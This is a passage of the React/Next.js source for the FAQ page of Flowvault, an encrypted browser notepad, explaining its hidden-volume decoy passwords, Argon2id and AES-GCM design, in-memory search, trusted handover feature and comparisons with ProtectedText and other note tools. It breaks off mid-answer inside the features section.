import type { Metadata } from "next";
import { isValidElement, type ReactNode } from "react";
import { Navbar } from "@/components/Navbar";
import Link from "next/link";
import { DONATE_PATH, APP_URL } from "@/lib/config";

const FAQ_TITLE =
  "FAQ — Flowvault: encrypted online notepad, Cmd+K in-memory search, Markdown preview, Bring-Your-Own-Storage local vaults, trusted handover to a beneficiary, time-locked notes, Encrypted Send, encrypted backup & restore; ProtectedText / Standard Notes / CryptPad / Privnote / Bitwarden Send alternative";
const FAQ_DESCRIPTION =
  "Honest answers about Flowvault: how plausible-deniability hidden volumes work, how the Cmd+K command-palette search runs entirely in memory over the notebooks you've already unlocked (no persistent index, no server round-trip, deniability preserved), how the Markdown preview renders GitHub-flavored Markdown safely (HTML blocked, external images click-to-load, no-referrer links, syntax-highlighted code), how Bring-Your-Own-Storage local vaults keep the entire ciphertext on your own disk as a single .flowvault file, how the trusted handover releases a vault to a beneficiary if you stop checking in, how drand-backed time-locked notes keep messages sealed until a future date, how Encrypted Send creates self-destructing one-time links with view caps and optional passwords, how zero-knowledge .fvault backup and restore let you migrate or self-host without decrypting anything server-side, and how Flowvault compares to ProtectedText, Standard Notes, CryptPad, Privnote, OneTimeSecret, PrivateBin, Yopass, Notesnook, Joplin, Obsidian, Bitwarden Send, 1Password Share, and Skiff Notes.";

export const metadata: Metadata = {
  title: FAQ_TITLE,
  description: FAQ_DESCRIPTION,
  keywords: [
    "encrypted notepad FAQ",
    "zero knowledge notes FAQ",
    "ProtectedText alternative",
    "Standard Notes alternative",
    "CryptPad alternative",
    "Privnote alternative",
    "OneTimeSecret alternative",
    "PrivateBin alternative",
    "Yopass alternative",
    "Bitwarden Send alternative",
    "1Password Share alternative",
    "trusted handover notepad",
    "vault inheritance",
    "beneficiary access encrypted notes",
    "dead man's switch notepad",
    "dead man's switch notes",
    "inactivity-triggered release encrypted notes",
    "emergency access encrypted notes",
    "time-locked notes",
    "drand tlock",
    "plausible deniability notes",
    "encrypted send",
    "one-time secret link",
    "self-destructing note",
    "burn after reading",
    "encrypted notepad backup",
    "zero-knowledge backup file",
    "Flowvault backup",
    "Flowvault export",
    "Flowvault restore",
    "export encrypted notes",
    "encrypted notepad to Markdown",
    "migrate ProtectedText notes",
    "self-host encrypted notepad",
    "fvault backup format",
    "portable encrypted note file",
    "bring your own storage encrypted notepad",
    "BYOS encrypted notes",
    "local encrypted notepad file",
    "local first encrypted notes browser",
    "File System Access API encrypted notes",
    ".flowvault local file format",
    "offline encrypted notepad local file",
    "self-hosted encrypted notes without a server",
    "encrypted notes stored on my own device",
    "S3 encrypted notes backend",
    "WebDAV encrypted notes backend",
    "markdown preview encrypted notes",
    "GitHub flavored markdown notepad",
    "encrypted notepad code highlighting",
    "zero knowledge markdown editor",
    "markdown notes without external images",
    "no-referrer markdown preview",
    "prism syntax highlighting encrypted notes",
    "cmd+k search encrypted notes",
    "command palette encrypted notepad",
    "search zero knowledge notes",
    "in-memory search encrypted notes",
    "client-side search encrypted notepad",
    "search without server index",
    "deniable notes search",
  ],
  alternates: { canonical: "/faq" },
  openGraph: {
    type: "article",
    url: `${APP_URL}/faq`,
    title: FAQ_TITLE,
    description: FAQ_DESCRIPTION,
  },
  twitter: {
    card: "summary_large_image",
    title: FAQ_TITLE,
    description: FAQ_DESCRIPTION,
  },
};

interface QA {
  q: string;
  a: React.ReactNode;
}

const ABOUT: QA[] = [
  {
    q: "What is Flowvault?",
    a: (
      <>
        Flowvault is an encrypted notepad. You pick a URL like{" "}
        <Code>useflowvault.com/s/my-notes</Code>, set a password, and
        write. Your
        notes are encrypted in your browser before they reach our server, so
        we only ever see an opaque ciphertext blob.
      </>
    ),
  },
  {
    q: "Can I try it without committing a password?",
    a: (
      <>
        <p>
          Yes. There&apos;s a live public demo at{" "}
          <Link href="/s/demo" className="text-accent hover:underline">
            useflowvault.com/s/demo
          </Link>
          {" "}with two pre-loaded notebooks behind two different
          passwords, so you can feel the hidden-volume design work with
          your own eyes in about 30 seconds.
        </p>
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Code>CorrectPassword</Code> opens the &ldquo;real&rdquo;
            notebook &mdash; a walkthrough plus example tabs for
            wallet seeds, API-key rotation, and a scratchpad.
          </li>
          <li>
            <Code>DecoyPassword</Code> opens the decoy &mdash; a
            deliberately boring cover notebook (shopping list,
            recipes), shaped like what a plausible decoy actually
            looks like in the wild.
          </li>
        </ul>
        <p className="mt-3">
          Same URL. Same ciphertext blob on our server. Two completely
          different screens. The blob is indistinguishable whether the
          other notebook is there or not &mdash; that&apos;s the whole
          deniability property, end-to-end visible without you having
          to pick a password of your own.
        </p>
        <p className="mt-3">
          <Strong>Trust boundary for the demo:</Strong> the server
          rejects all writes at the demo URL. You can edit anything
          in your browser to poke around, but nothing you type is
          saved, shared, or visible to the next visitor &mdash; the
          vault resets the moment you close the tab. Don&apos;t put
          real secrets in it anyway &mdash; it is a public,
          credentialed walkthrough.
        </p>
      </>
    ),
  },
  {
    q: "Should I actually use Flowvault, or something else?",
    a: (
      <>
        <p>
          An honest shortlist &mdash; we&apos;d rather you pick the
          right tool than convert you to the wrong one.
        </p>
        <p className="mt-3">
          <Strong>Pick Flowvault if:</Strong> you want a browser-only
          encrypted scratchpad with no account, you want hidden-volume
          deniability (multiple passwords on the same URL unlock
          different notebooks), or you need an account-less
          self-destructing share link. Typical users: people replacing
          ProtectedText, people stashing wallet seeds / API keys /
          medical info, and people who want a decoy password for
          travel.
        </p>
        <p className="mt-3">
          <Strong>Pick something else if:</Strong> you want a
          multi-device notes app &mdash;{" "}
          <a
            href="https://standardnotes.com"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            Standard Notes
          </a>{" "}
          or{" "}
          <a
            href="https://notesnook.com"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            Notesnook
          </a>{" "}
          are excellent there. You keep long-form journals &mdash;{" "}
          <a
            href="https://obsidian.md"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            Obsidian
          </a>{" "}
          or{" "}
          <a
            href="https://joplinapp.org"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            Joplin
          </a>{" "}
          handle volume better. You want real-time collaborative
          editing &mdash; use{" "}
          <a
            href="https://cryptpad.fr"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            CryptPad
          </a>
          . You&apos;re storing the <em>only</em> copy of a crypto
          wallet seed &mdash; use{" "}
          <a
            href="https://keepassxc.org"
            target="_blank"
            rel="noreferrer"
            className="text-accent hover:underline"
          >
            KeePassXC
          </a>{" "}
          or a paper backup in a safe, and at most keep Flowvault as a
          <em> second</em> location for a split seed.
        </p>
        <p className="mt-3">
          The realistic shape is: Flowvault complements a local-first
          app, it doesn&apos;t replace one. A lot of users end up
          running both.
        </p>
      </>
    ),
  },
  {
    q: "Does Flowvault work on mobile / iOS / Android / Safari / Firefox?",
    a: (
      <>
        <p>
          Partially. Here&apos;s the honest matrix:
        </p>
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>The core hosted vault</Strong> (
            <Code>/s/&lt;slug&gt;</Code>) works in every modern
            browser &mdash; iOS Safari, Android Chrome, desktop
            Firefox, desktop Safari. You can unlock, read, and write
            from a phone, it just isn&apos;t optimised into a
            standalone app experience.
          </li>
          <li>
            <Strong>Bring Your Own Storage</Strong> (local{" "}
            <Code>.flowvault</Code> files) requires the{" "}
            <a
              href="https://developer.mozilla.org/en-US/docs/Web/API/File_System_API"
              target="_blank"
              rel="noreferrer"
              className="text-accent hover:underline"
            >
              File System Access API
            </a>
            , which today ships in Chromium-based browsers on
            desktop only (Chrome, Edge, Brave, Arc, Opera,
            Vivaldi). Firefox and Safari don&apos;t implement it
            yet; mobile support is spotty.
          </li>
          <li>
            <Strong>There is no native app</Strong> &mdash; no iOS
            app, no Android app, no Electron build. It is a
            deliberately server-agnostic web app. We may add a PWA
            with offline mode (it&apos;s on the roadmap), but
            native apps aren&apos;t on the near-term plan.
          </li>
        </ul>
        <p className="mt-3">
          If mobile-first editing or offline-first workflow is a
          hard requirement, use Standard Notes, Notesnook, or
          Obsidian. Flowvault is a better fit as the
          &ldquo;browser tab you open for one specific purpose&rdquo;
          than as your daily driver for a 5,000-note knowledge base.
        </p>
      </>
    ),
  },
  {
    q: "Is 8 KiB per notebook actually enough?",
    a: (
      <>
        <p>
          Depends on what you write. Concrete reference points:
        </p>
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>~1,500 words</Strong> of prose per slot, or
            roughly 4&ndash;5 tightly-written pages.
          </li>
          <li>
            <Strong>A crypto wallet seed</Strong> (24 BIP-39
            words): ~150 bytes. You can store{" "}
            <em>dozens</em> of them per slot.
          </li>
          <li>
            <Strong>A password manager export</Strong> of 300 short
            credentials: ~15 KiB. Doesn&apos;t fit in one slot,
            does fit across two tabs.
          </li>
          <li>
            <Strong>A daily journal entry</Strong> of 300 words:
            ~2 KiB. A slot is full after ~4&ndash;5 entries.
          </li>
          <li>
            <Strong>A meeting-notes workflow</Strong> (20 notes /
            month, 400 words each): ~40 KiB / month. A slot fills
            in 5 days.
          </li>
        </ul>
        <p className="mt-3">
          Good rule of thumb: if you&apos;re writing{" "}
          <em>reference material</em> (credentials, recipes, how-tos,
          contact lists, TODO lists, one-off scratch), 8 KiB per
          slot × up to 64 slots is plenty. If you&apos;re writing{" "}
          <em>log-style material</em> (journal, meeting notes,
          daily standup), you&apos;ll hit the ceiling within weeks
          and the friction is real &mdash; use something built for
          that shape. Per-notebook limits can be raised in future
          vault versions (the on-disk format is already param-driven),
          but the current default is a tradeoff against keeping the
          fixed-size blob small enough to stay snappy on mobile
          connections.
        </p>
      </>
    ),
  },
  {
    q: "Do I need to create an account?",
    a: "No. There is no sign-up, no email, no phone number. A URL slug plus a password is the entire identity system.",
  },
  {
    q: "How much does it cost?",
    a: "Free for normal personal use. We may add a paid tier later for custom domains and larger vaults, but the core notepad will stay free.",
  },
];

const VS_PROTECTED_TEXT: QA[] = [
  {
    q: "I already use ProtectedText. Why switch?",
    a: (
      <>
        Four concrete differences, in honest order:
        <ol className="mt-3 list-decimal space-y-2 pl-5">
          <li>
            <Strong>No legacy plaintext-password blob.</Strong> Inspect{" "}
            <Code>protectedtext.com/js/main.js</Code> &mdash; every save
            still uploads a parallel <Code>encryptedContentLegacy</Code>{" "}
            blob keyed only by the raw password (for backwards compatibility
            with older clients). If their database is ever stolen, attackers
            can crack that legacy blob without doing any Argon2 work at all.
            Flowvault has no such fallback &mdash; every blob requires the
            full Argon2 chain.
          </li>
          <li>
            <Strong>Authenticated encryption.</Strong> Flowvault uses
            AES-256-GCM, which detects any tampering with the ciphertext.
            ProtectedText uses AES-256-CBC via the legacy CryptoJS library,
            which is malleable: bitflips in the blob go undetected.
          </li>
          <li>
            <Strong>Plausible deniability via hidden volumes.</Strong> One
            Flowvault URL can hold multiple independent notebooks, each
            behind a different password, all packed into one fixed-size
            blob. ProtectedText is one password, one blob &mdash; no decoy
            possible without a breaking format change.
          </li>
          <li>
            <Strong>Open backend.</Strong> ProtectedText publishes its
            client JS for inspection but their FAQ explicitly says the
            server code is closed. Flowvault publishes the frontend, the
            Cloud Functions, and the Firestore security rules &mdash; the
            entire stack is reviewable, licensed, and self-hostable.
          </li>
        </ol>
        <p className="mt-3">
          <Strong>What we&apos;re NOT claiming:</Strong> ProtectedText today
          actually does use Argon2id (32 MiB, adaptive ~300 ms) for the
          primary blob &mdash; it&apos;s a real KDF, in the same family as
          ours (64 MiB, 3 iters, HKDF expansion). The KDF gap is small. The
          legacy-blob issue, the malleable cipher, and the lack of
          deniability are the real differences.
        </p>
      </>
    ),
  },
  {
    q: "What is \"plausible deniability\" in practice?",
    a: (
      <>
        One URL can hold multiple notebooks, each behind a different
        password. The server stores one fixed-size blob; it cannot tell how
        many notebooks live inside. If someone coerces a password out of you
        at a border crossing or in a legal process, you hand over a decoy
        password that opens a decoy notebook full of mundane content. Your
        real notebook stays as cryptographically random-looking bytes in the
        same blob. Nobody &mdash; not us, not an attacker with a copy of the
        blob &mdash; can prove another notebook exists.
      </>
    ),
  },
  {
    q: "Is ProtectedText insecure?",
    a: (
      <>
        No. ProtectedText is a solid, long-running, popular service and we
        respect what they built &mdash; we wouldn&apos;t exist without it as
        prior art. Flowvault is aimed at people who want a stronger threat
        model (coercion, offline brute force of stolen DBs, tampering, open
        server code) and don&apos;t mind switching. For a quick private
        scratchpad, ProtectedText is perfectly fine.
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Standard Notes?",
    a: (
      <>
        <Strong>Standard Notes</Strong> is an excellent end-to-end-encrypted
        note-taking app focused on long-form personal knowledge management.
        It has clients on every platform, sync across devices, and a real
        company behind it. It also requires an{" "}
        <Strong>account (email + password)</Strong>, and most useful
        features (Markdown rendering, code editor, daily writing prompts,
        cloud backups, tags) live behind a paid subscription.
        <p className="mt-3">
          Flowvault has a different shape: no account, no email, no app
          install, no subscription. You type a URL, set a password, and
          start writing in a browser tab. It&apos;s closer to ProtectedText
          than to Standard Notes in spirit. We add hidden volumes and a
          fully open backend on top. Pick Standard Notes if you want a
          long-term encrypted journal across devices; pick Flowvault if you
          want a no-account scratchpad with deniability.
        </p>
      </>
    ),
  },
  {
    q: "How does Flowvault compare to CryptPad?",
    a: (
      <>
        <Strong>CryptPad</Strong> is a fantastic, fully open-source
        encrypted office suite (docs, sheets, slides, kanban, code) built by
        XWiki SAS in France. It&apos;s the right answer if you need
        real-time collaborative editing with cryptography. The trade-off:
        long-term storage requires an account, the UI is a full app rather
        than a notepad, and it doesn&apos;t offer hidden-volume
        deniability &mdash; one user, one set of pads.
        <p className="mt-3">
          Flowvault is much smaller in scope (plain text, single pane, one
          URL = one vault). If you want a Google Docs replacement, use
          CryptPad. If you want a hidden, deniable scratchpad you can open
          from any browser without signing in, use Flowvault.
        </p>
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Privnote, OneTimeSecret, PrivateBin, and other burn-after-reading services?",
    a: (
      <>
        Flowvault now does both &mdash; long-lived notebooks{" "}
        <em>and</em> one-shot self-destructing links &mdash; so you
        don&apos;t have to pick a second tool.
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            For the persistent side (the notepad you return to for
            years), Flowvault uniquely offers{" "}
            <Strong>plausible-deniability hidden volumes</Strong>:
            multiple passwords on the same URL unlock different
            notebooks. Privnote, OneTimeSecret, PrivateBin, and Yopass
            don&apos;t do persistence at all.
          </li>
          <li>
            For the one-shot side (a password for a colleague, a
            recovery phrase, an API key),{" "}
            <Link href="/send/new" className="text-accent hover:underline">
              Encrypted Send
            </Link>{" "}
            is Flowvault&apos;s direct answer. AES-256-GCM in the
            browser, key in the URL fragment, server-enforced view cap
            (default 1) with atomic hard-delete, optional Argon2id
            password gate on top, expiry up to 30 days, and the whole
            stack is open source end-to-end (frontend + Cloud Functions
            + Firestore rules). See the full comparison table on the{" "}
            <Link href="/" className="text-accent hover:underline">
              homepage
            </Link>
            .
          </li>
        </ul>
        <p className="mt-3">
          The short version: use Privnote/OneTimeSecret if you&apos;re
          already there, use{" "}
          <Link href="/send/new" className="text-accent hover:underline">
            /send/new
          </Link>{" "}
          if you want an account-less, open-source alternative that
          lives next to your long-lived vault.
        </p>
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Joplin and Obsidian?",
    a: (
      <>
        <Strong>Joplin</Strong> and <Strong>Obsidian</Strong> are
        local-first desktop note apps. Joplin offers optional E2EE sync
        through your own provider; Obsidian sells Obsidian Sync as a paid
        E2EE add-on, otherwise notes live on your disk. Both are excellent
        for power users who want a knowledge graph, tags, plugins, and
        offline-first storage on a real device.
        <p className="mt-3">
          They&apos;re a different category from Flowvault. Flowvault is
          designed for the case where you can&apos;t install software (a
          friend&apos;s laptop, a school computer, a hotel kiosk, a phone
          you don&apos;t own), or where you want plausible deniability
          rather than local-disk encryption. The ideal setup is probably
          both: Obsidian or Joplin at home, Flowvault for everywhere else.
        </p>
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Notesnook?",
    a: (
      <>
        <Strong>Notesnook</Strong> is a polished, fully open-source
        end-to-end-encrypted notes app with native clients on every
        platform, a free tier, and a paid Pro tier for advanced features.
        It&apos;s a strong choice if you want an Evernote-style app with
        real cryptography. Like Standard Notes, it requires an account and
        is centered on a multi-device app experience.
        <p className="mt-3">
          Flowvault is account-less and browser-only. We don&apos;t compete
          on app polish or device sync &mdash; we compete on{" "}
          <Strong>zero metadata</Strong> (we don&apos;t even know who you
          are) and <Strong>hidden-volume deniability</Strong>. If you want
          an encrypted note <em>app</em>, Notesnook is great. If you want an
          encrypted note <em>URL</em> with deniability, that&apos;s us.
        </p>
      </>
    ),
  },
  {
    q: "I used Skiff Notes. Where should I go now?",
    a: (
      <>
        Skiff was acquired by Notion in early 2024 and shut down. If you
        liked Skiff for the encrypted-Notion vibe, look at{" "}
        <Strong>Proton Docs</Strong> or <Strong>CryptPad</Strong> for
        document-style use, or <Strong>Standard Notes</Strong> /{" "}
        <Strong>Notesnook</Strong> for note-app use. For quick anonymous
        scratch notes, Flowvault and ProtectedText are the spiritual
        successors to the &ldquo;just give me a URL&rdquo; model.
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Bitwarden Send / Bitwarden Notes / 1Password Secure Notes / 1Password Share?",
    a: (
      <>
        Password managers&apos; secure-notes features are excellent for
        short, structured secrets attached to a credential (license
        keys, recovery codes, one-line answers). They live inside an
        account protected by a master password and your device&apos;s
        vault. Two separate comparisons here:
        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>Bitwarden Send / 1Password Share</Strong>{" "}
            (ephemeral one-off shares). Flowvault now ships{" "}
            <Link href="/send/new" className="text-accent hover:underline">
              Encrypted Send
            </Link>
            , which plays in this exact lane &mdash; and unlike
            Bitwarden Send / 1Password Share, it doesn&apos;t require
            an account on the <em>sender&apos;s</em> side and the
            entire stack (frontend, Cloud Functions, Firestore rules)
            is open source in a single repo. Password gate, URL-fragment
            key, atomic server-enforced view cap &mdash; same
            threat-model promises.
          </li>
          <li>
            <Strong>Bitwarden Notes / 1Password Secure Notes</Strong>{" "}
            (persistent notes inside a password manager). Flowvault is
            for free-form text you want to keep coming back to, without
            an account, without installing anything, and with the
            option to hide some of it behind a decoy password. Use
            both: structured credentials in your password manager,
            free-form scratch + deniable notebooks in Flowvault.
          </li>
        </ul>
      </>
    ),
  },
  {
    q: "How does Flowvault compare to Cryptee, Turtl, HedgeDoc, dontpad, Etherpad?",
    a: (
      <>
        Quick survey:
        <ul className="mt-3 list-disc space-y-2 pl-5">
          <li>
            <Strong>Cryptee</Strong>: Estonia-based, encrypted notes and
            photos, account required. Beautiful but a different shape than a
            no-login notepad.
          </li>
          <li>
            <Strong>Turtl</Strong>: open-source encrypted notes app with
            account-based sync. Closer to Standard Notes than to
            ProtectedText.
          </li>
          <li>
            <Strong>HedgeDoc</Strong> (formerly CodiMD, fork of HackMD):
            collaborative Markdown editor. Excellent for shared drafts but
            generally not encrypted at rest unless you self-host with care.
          </li>
          <li>
            <Strong>dontpad</Strong>, <Strong>Etherpad</Strong>,{" "}
            <Strong>pad.riseup.net</Strong>: collaborative pads,{" "}
            <em>not</em> encrypted &mdash; the operator can read your
            content. Useful for non-sensitive coordination, not for
            secrets.
          </li>
        </ul>
        <p className="mt-3">
          If your top requirement is &ldquo;an encrypted notepad I can open
          in a browser without signing in,&rdquo; the realistic field is
          essentially Flowvault and ProtectedText. Everything else is a
          different category.
        </p>
      </>
    ),
  },
];

const SECURITY: QA[] = [
  {
    q: "What does the server actually see?",
    a: (
      <>
        A SHA-256-derived site id (not your slug), an opaque ciphertext blob,
        your Argon2id salt, the KDF and volume parameters, and timestamps.
        That&apos;s it. No passwords, no keys, no plaintext, no clue how many
        notebooks a vault contains.
      </>
    ),
  },
  {
    q: "Is my password ever transmitted?",
    a: "No. Your password is used purely in-browser to derive the encryption key. The only thing your browser sends to the server is ciphertext. Verify this yourself by opening the Network tab while saving.",
  },
  {
    q: "Why Argon2id instead of PBKDF2 or SHA-512?",
    a: (
      <>
        Because modern password cracking is done on GPUs and ASICs that are
        terrible at the &ldquo;memory-hard&rdquo; access patterns Argon2id
        forces. Iterated SHA-512 or PBKDF2 cost attackers cents per billion
        guesses on commodity GPUs. Argon2id with 64 MiB of memory forces each
        guess to allocate real RAM, slashing throughput by orders of
        magnitude. It&apos;s also the winner of the Password Hashing
        Competition and the OWASP-recommended default.
      </>
    ),
  },
  {
    q: "What if you get hacked?",
    a: "An attacker who steals the entire Firestore would get a pile of ciphertext blobs plus salts. No passwords, no keys. They would still have to run Argon2id-protected offline brute force, one password at a time, per vault. That's the zero-knowledge design working as intended.",
  },
  {
    q: "Can you be compelled to hand over my notes?",
    a: "We can only hand over what we have: ciphertext. We don't have your password, your derived keys, or any way to recover them. If a court ordered us to give a notebook to a third party, we would give them the same ciphertext you could download yourself from Firestore — unreadable without your password.",
  },
  {
    q: "Is the frontend code verifiable?",
    a: (
      <>
        The source is open. Today you trust that the JavaScript your browser
        downloads matches the source on GitHub &mdash; the same trust
        assumption as every browser-based crypto app. We plan to publish
        signed bundle hashes for each release so you can verify the bundle
        your browser ran. See the{" "}
        <Link href="/security" className="text-accent hover:underline">
          security page
        </Link>{" "}
        for the current state.
      </>
    ),
  },
];

const USAGE: QA[] = [
  {
    q: "I forgot my password. Can I recover my notes?",
    a: "No. That's the whole point. There is no &ldquo;reset&rdquo; link because there is no copy of your key anywhere. Write your password somewhere safe.",
  },
  {
    q: "Can two people share a vault?",
    a: "Yes. Share the URL and the password over a trusted channel. Both people can read and edit. If they edit at the same time, the second writer gets a conflict error instead of overwriting the first — so you won't silently lose data.",
  },
  {
    q: "How big can a notebook be?",
    a: "Each slot holds around 8 KiB of text (roughly 1,500 words) in the default configuration, shared across all the tabs you create for that password. A single vault holds 64 slots for a total of 512 KiB. Spreading one notebook across multiple slots for longer content is on the roadmap.",
  },
  {
    q: "Can I have multiple notebooks under one password?",
    a: (
      <>
        Yes. Each password unlocks a <Strong>workspace of tabs</Strong>,
        not a single page. Click <Code>+ New</Code> above the editor to
        add a tab, double-click (or hover and click the pencil) to
        rename, drag tabs to reorder, and click the <Code>&times;</Code>{" "}
        to delete. All tabs &mdash; their titles, order, and contents
        &mdash; live inside the same encrypted slot, so the server sees
        one opaque blob the same as before. The tab list itself is
        zero-knowledge: nobody who does not have your password can tell
        how many tabs you have or what they&apos;re called.
      </>
    ),
  },
  {
    q: "If I add tabs, can someone with my decoy password see them?",
    a: (
      <>
        No. Decoy passwords land in their own separate slot with their
        own tab set. Adding or deleting tabs in your real notebook does
        not touch the decoy&apos;s slot at all &mdash; and vice versa.
        From the server&apos;s perspective the ciphertext blob is a
        fixed size no matter how many tabs exist in any slot, so the
        tab count is not even observable as metadata.
      </>
    ),
  },
  {
    q: "Can I use Flowvault offline?",
    a: "Not yet. A PWA / offline mode with local-first sync is on the roadmap.",
  },
  {
    q: "Can I add a decoy password to an existing vault?",
    a: (
      <>
        Yes. Open your vault, click <Strong>Add password</Strong> in the
        editor toolbar, and pick a new password. Optionally seed the new
        notebook with some initial content (useful if it&apos;s meant to look
        ordinary when handed over under coercion). Each password unlocks its
        own notebook; nobody &mdash; not us, not an adversary with a copy of
        your blob &mdash; can tell how many you have.
      </>
    ),
  },
  {
    q: "What happens if two passwords collide on the same slot?",
    a: (
      <>
        Each password hashes into one of <Strong>64</Strong> slot positions.
        The chance of two independent passwords landing on the same slot is
        about <Code>1/64</Code> (~1.6%). For three passwords it&apos;s ~4.7%;
        for five, ~14%. On collision one notebook overwrites the other
        &mdash; we cannot detect collisions across passwords without storing
        metadata that would break deniability. The one case we <em>do</em>
        catch: Flowvault refuses to register a new password whose slot would
        overwrite the notebook you currently have open. If collisions matter
        for your threat model, just pick a different password and try again.
      </>
    ),
  },
];

const SEARCH: QA[] = [
  {
    q: "Is there a search feature?",
    a: (
      <>
        Yes. Press <Code>Ctrl</Code>/<Code>Cmd</Code> + <Code>K</Code>{" "}
        inside the editor (or click the <Strong>Search</Strong>{" "}
        button in the toolbar) to open a command palette. It does a
        case-insensitive substring match across the titles{" "}
        <em>and</em> contents of every tab in the slot you currently
        have unlocked, grouped per notebook, with line numbers and
        match highlighting. <Code>↑ ↓</Code> navigates,{" "}
        <Code>Home</Code>/<Code>End</Code> jump to the first/last
        hit, <Code>Enter</Code> opens the match, <Code>Esc</Code>{" "}
        closes.
      </>
    ),
  },
  {
    q: "Does search send anything to your server or build an index somewhere?",
    a: (
      <>
        No. The search runs entirely in your browser, against the
        plaintext that&apos;s already in memory because you unlocked
        the slot. There is no persistent index, no{" "}
        <Code>IndexedDB</Code> store, no{" "}
        <Code>localStorage</Code> cache, and no network round-trip
        to our backend. The corpus is small by design (at most 64
        slots × a few KiB per slot in the default configuration),
        so the scan is fast enough to run on every keystroke
        without debouncing. Locking the vault drops the in-memory
        bundle and drops the search surface with it &mdash;
        there&apos;s literally nothing left to query once you log
        out.
      </>
    ),
  },
  {
    q: "Can search see my hidden / decoy notebooks?",
    a: (
      <>
        Only the ones you&apos;ve unlocked in the current browser
        session. Flowvault&apos;s plausible-deniability design
        means the other slots are not decrypted into memory at
        all &mdash; they&apos;re still opaque bytes in the vault
        blob &mdash; so the search palette is{" "}
        <em>physically incapable</em> of traversing them. A match
        that exists under a different password would require you
        to enter that password first. This is the same invariant
        that keeps a decoy password&apos;s notebooks invisible
        from your primary session; search inherits it for free.
      </>
    ),
  },
  {
    q: "Can someone with my decoy password search my real notebooks?",
    a: (
      <>
        No. The decoy password unlocks its own, independent slot
        &mdash; that&apos;s all that gets decrypted into memory
        when a decoy session runs. Your real notebook&apos;s
        plaintext never enters that session&apos;s bundle, so the
        Cmd+K palette has nothing to find there. From a
        coercion-resistance standpoint, search doesn&apos;t widen
        the attack surface any more than the editor itself does.
      </>
    ),
  },
  {
    q: "Does search work with the Markdown preview / split view?",
    a: (
      <>
        Yes. If you pick a content match while you&apos;re in pure
        Preview mode (no textarea visible), the editor flips to
        Edit automatically so the selection has somewhere to land;
        Split stays Split. Either way, selecting a hit switches
        to the right notebook tab and selects the match range
        directly in the textarea, so the browser scrolls it into
        view for you. Title-only hits just switch to the matching
        notebook without touching the caret.
      </>
    ),
  },
  {
    q: "Why is there a per-notebook cap on results?",
    a: (
      <>
        To keep the palette readable. A single notebook that
        contains a common word (&ldquo;the,&rdquo;
        &ldquo;note,&rdquo; etc.) could otherwise fill the entire
        results list and push every other notebook&apos;s
        matches off the screen. The cap is 20 hits per notebook
        and 100 hits total &mdash; more than enough for real
        queries, and if you&apos;re hitting the ceiling it&apos;s
        usually a sign to type a more specific query rather than
        scroll further.
      </>
    ),
  },
  {
    q: "Do other zero-knowledge notepads have search that doesn't leak metadata?",
    a: (
      <>
        The field is mixed, and it&apos;s the area where
        &ldquo;E2EE&rdquo; marketing most often leaks. A few
        concrete reference points:
        <ul className="mt-2 list-disc space-y-1 pl-5">
          <li>
            <Strong>ProtectedText</Strong>: no search. One
            password opens one blob and you scroll.
          </li>
          <li>
            <Strong>Standard Notes</Strong>,{" "}
            <Strong>Notesnook</Strong>: encrypted search, but it
            relies on a client-side index that&apos;s built and
            persisted locally (so a search surface outlives the
            session), and it&apos;s tied to an account.
          </li>
          <li>
            <Strong>Obsidian</Strong>, <Strong>Joplin</Strong>:
            local-first with excellent search &mdash; but over
            files on disk, not a deniable, server-hosted blob.
          </li>
        </ul>
        <p className="mt-3">
          Flowvault&apos;s choice is deliberately minimal: the
          search &ldquo;index&rdquo; is just the plaintext of
          the slot you&apos;re already viewing, and nothing is
          written anywhere for it. You trade the ability to
          query locked slots for a property that&apos;s hard to
          match &mdash; search that can&apos;t survive a lock,
          can&apos;t be subpoenaed, and can&apos;t be
          exfiltrated as an index later.
        </p>
      </>
    ),
  },
];

const FEATURES: QA[] = [
  {
    q: "What is the trusted handover?",
    a: (
      <>
        An opt-in way to say: &ldquo;if I stop checking in for X days, let
        this trusted person decrypt my vault.&rdquo; You pick a{" "}
        <Strong>beneficiary password</Strong> (different from your own) and
        share it with them out of band. The browser derives a beneficiary
        key with Argon2id, wraps your master key with AES-GCM under it, and
        uploads a ~60-byte wrapped blob. Every save counts as a heartbeat;
        if you go quiet past the interval + grace you configured, an hourly
        Cloud Function marks the vault{" "}
        <Code>released</Code>, and the beneficiary can then visit the URL,
        enter their password, unwrap the master key, and read the notebook.
      </>
    ),
  },
  {
    q: "Is the trusted handover zero-knowledge too?",
    a: (
      <>
        The cryptography is, yes &mdash; the server never sees the
        beneficiary password, the master key, or the plaintext. We do
        <em> acknowledge</em> two visible side-effects we can&apos;t avoid
        without losing the ability to schedule the release: the{" "}
        <Strong>existence</Strong> of a handover on the vault, and the{" "}
        interval / grace / last-heartbeat metadata. The wrapped key and
        beneficiary salt themselves are opaque ciphertext.
      </>
    ),
  },
  {
    q: "Can someone else fake a heartbeat to keep my vault alive forever?",
    a: (
      <>
        Only if they already have your master key. Heartbeats piggyback on
        saves, and every save re-encrypts the whole ciphertext blob with
        the master key &mdash; so an attacker with only read access to the
        document cannot produce a valid new ciphertext to extend the timer.
        They can overwrite it with garbage (that&apos;s a general issue
        with any password-only zero-knowledge notepad, and the defense we
        plan to add is a Cloud Function that requires a proof of master-key
        knowledge for writes). But they can&apos;t secretly keep the
        handover from firing.
      </>
    ),
  },
  {
    q: "Can I cancel a trusted handover?",
    a: (
      <>
        While it&apos;s still active (not released yet): yes, any time,
        from the editor toolbar &mdash; that removes the wrapped key blob
        from the document entirely. Once it has released, no: the Firestore
        rules lock the document against further writes, because the
        wrapped key has already been sitting in a potentially-public
        document and anyone who knew the URL could have grabbed a copy.
